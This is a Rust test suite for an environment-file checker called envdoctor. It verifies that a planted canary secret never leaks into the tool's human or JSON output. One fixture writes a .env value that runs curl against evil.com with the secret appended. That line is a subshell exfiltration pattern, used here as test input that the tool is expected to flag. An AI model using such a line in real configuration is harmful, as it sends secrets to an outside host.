//! Canary Secret Leakage Testing Suite (Step 6.1).
//!
//! Validates that high-entropy secret canary strings never leak into stdout, stderr,
//! log output, formatted human text, or serialized JSON reports under any circumstance.

#![allow(clippy::disallowed_methods)]

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};

pub const CANARY: &str = "SUPER_SECRET_CANARY_VALUE_XYZ_987654321";

static TEST_COUNTER: AtomicUsize = AtomicUsize::new(0);

struct TempWorkspace {
    dir: PathBuf,
}

impl TempWorkspace {
    fn new(name: &str) -> Self {
        let counter = TEST_COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir()
            .join("envdoctor_canary_tests")
            .join(format!("{}_{}_{}", name, std::process::id(), counter));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        Self { dir }
    }

    fn write_file(&self, rel_path: &str, content: &str) -> PathBuf {
        let full_path = self.dir.join(rel_path);
        if let Some(parent) = full_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&full_path, content).unwrap();
        full_path
    }

    fn path(&self) -> &Path {
        &self.dir
    }
}

impl Drop for TempWorkspace {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.dir);
    }
}

fn bin_path() -> PathBuf {
    env!("CARGO_BIN_EXE_envdoctor").into()
}

fn assert_zero_canary_leakage(output: &std::process::Output) {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    assert!(
        !stdout.contains(CANARY),
        "CANARY LEAKED IN STDOUT:\n---\n{}\n---",
        stdout
    );
    assert!(
        !stderr.contains(CANARY),
        "CANARY LEAKED IN STDERR:\n---\n{}\n---",
        stderr
    );
}

#[test]
fn test_canary_valid_assignments() {
    let ws = TempWorkspace::new("canary_valid");
    let contract = ws.write_file(
        ".env.example",
        "AUTH_TOKEN=placeholder\nDATABASE_URL=postgres://localhost\n",
    );
    let env_file = ws.write_file(
        ".env",
        &format!(
            "AUTH_TOKEN={}\nDATABASE_URL=postgres://user:{}@localhost/db\n",
            CANARY, CANARY
        ),
    );
    ws.write_file(
        "src/index.ts",
        "const t = process.env.AUTH_TOKEN;\nconst db = process.env.DATABASE_URL;\n",
    );

    // 1. Human output format
    let out_human = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("human")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&out_human);

    // 2. JSON output format
    let out_json = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("json")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&out_json);
}

#[test]
fn test_canary_malformed_syntax_env005() {
    let ws = TempWorkspace::new("canary_malformed");
    let contract = ws.write_file(".env.example", "PORT=3000\n");
    let env_file = ws.write_file(
        ".env",
        &format!(
            "PORT=3000\nTHIS_LINE_IS_MALFORMED_WITHOUT_EQUALS_{}\nANOTHER_BAD = foo bar baz {}\n",
            CANARY, CANARY
        ),
    );
    ws.write_file("src/app.ts", "console.log(process.env.PORT);");

    let output = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("human")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&output);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("ENV005"));
}

#[test]
fn test_canary_unsupported_syntax_env006() {
    let ws = TempWorkspace::new("canary_unsupported");
    let contract = ws.write_file(".env.example", "TOKEN=val\nDYNAMIC=subshell\n");
    let env_file = ws.write_file(
        ".env",
        &format!(
            "TOKEN=\"hello ${{ENV_{}}}\"\nDYNAMIC=$(curl https://evil.com/{})\n",
            CANARY, CANARY
        ),
    );
    ws.write_file(
        "src/app.ts",
        "console.log(process.env.TOKEN);\nconsole.log(process.env.DYNAMIC);",
    );

    let output = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("json")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&output);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("ENV006"));
}

#[test]
fn test_canary_dynamic_bracket_access_and_aliasing_env010_env012() {
    let ws = TempWorkspace::new("canary_dynamic");
    let contract = ws.write_file(".env.example", "STATIC_VAR=default\n");
    let env_file = ws.write_file(
        ".env",
        &format!("STATIC_VAR={}\nSECRET_KEY={}\n", CANARY, CANARY),
    );
    ws.write_file(
        "src/app.ts",
        r#"
        const staticVal = process.env.STATIC_VAR;
        const dynamicProp = "SOMETHING";
        const val = process.env[dynamicProp]; // ENV010
        const copiedEnv = { ...process.env }; // ENV012
        "#,
    );

    let output = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("human")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&output);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("ENV010"));
    assert!(stdout.contains("ENV012"));
}

#[test]
fn test_canary_empty_required_value_and_missing_env003_env007() {
    let ws = TempWorkspace::new("canary_empty_and_missing");
    let contract = ws.write_file(
        ".env.example",
        "REQUIRED_EMPTY=must_not_be_empty\nREQUIRED_MISSING=must_be_present\nCANARY_VAR=placeholder\n"
    );
    let env_file = ws.write_file(".env", &format!("REQUIRED_EMPTY=\nCANARY_VAR={}\n", CANARY));
    ws.write_file(
        "src/app.ts",
        "console.log(process.env.REQUIRED_EMPTY);\nconsole.log(process.env.CANARY_VAR);\n",
    );

    let output = Command::new(bin_path())
        .arg("--contract")
        .arg(&contract)
        .arg("--env")
        .arg(&env_file)
        .arg("--path")
        .arg(ws.path())
        .arg("--format")
        .arg("json")
        .output()
        .expect("Failed to execute CLI");

    assert_zero_canary_leakage(&output);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("ENV003"));
    assert!(stdout.contains("ENV007"));
}

#[test]
fn test_canary_panic_and_debug_representation_safety() {
    use envdoctor::model::definition::Definition;
    use envdoctor::model::span::Span;
    use envdoctor::model::value::ValueKind;
    use envdoctor::redaction::RawEnvValue;

    // Test that RawEnvValue converts to ValueKind without keeping canary in memory
    let raw = RawEnvValue::new(CANARY, false);
    let kind = raw.into_kind();
    assert_eq!(kind, ValueKind::NonEmpty);

    // Test that Definition has no secret value fields
    let def = Definition::new(
        "SECRET_VAR",
        ".env",
        Span::point(1, 1, 0),
        ValueKind::NonEmpty,
        false,
    );
    let def_debug = format!("{:?}", def);
    assert!(!def_debug.contains(CANARY));
    let def_json = serde_json::to_string(&def).unwrap();
    assert!(!def_json.contains(CANARY));
}
